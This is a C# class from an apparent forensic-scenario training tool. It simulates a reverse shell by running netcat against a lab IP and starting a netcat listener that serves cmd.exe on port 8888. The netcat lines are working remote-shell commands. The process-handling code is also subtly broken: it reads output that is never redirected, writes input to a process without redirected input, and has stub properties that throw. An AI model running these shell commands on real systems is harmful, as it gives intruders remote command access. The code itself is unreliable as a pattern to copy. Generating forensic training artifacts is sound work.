using System;
using System.Diagnostics;
using System.IO;
using Caliburn.Micro;

namespace ForensicScenarios.Scenarios
{
    public class ReverseShell : PropertyChangedBase, IScenario
    {
        public string Description { get; set; }

        public string Status => throw new NotImplementedException();

        public int StatusValue => throw new NotImplementedException();

        private const string NAME = "Reverse Shell";

        public void Run()
        {
            string path = Directory.GetCurrentDirectory() + @"\Scripts\Attacker\nc.exe 192.168.10.101 8888";
            var prc = CreateProcess(path).Start();

            string path2 = Directory.GetCurrentDirectory() + @"\Scripts\Attacker\nc.exe -l -p 8888 -e cmd.exe";
            var prc2 = CreateProcess(path2, true);

            var prc3 = CreateProcess(string.Empty);

            prc2.Start();
            prc3.Start();
            prc3.StandardInput.Write(prc2.StandardOutput.ReadToEnd());
        }

        public override string ToString()
        {
            return NAME;
        }

        private Process CreateProcess(string path, bool createWindow = false)
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd", "/c " + path);
            processStartInfo.RedirectStandardOutput = false;
            processStartInfo.UseShellExecute = false;
            processStartInfo.CreateNoWindow = createWindow;

            Process process = new Process();
            process.StartInfo = processStartInfo;

            return process;
        }
    }
}
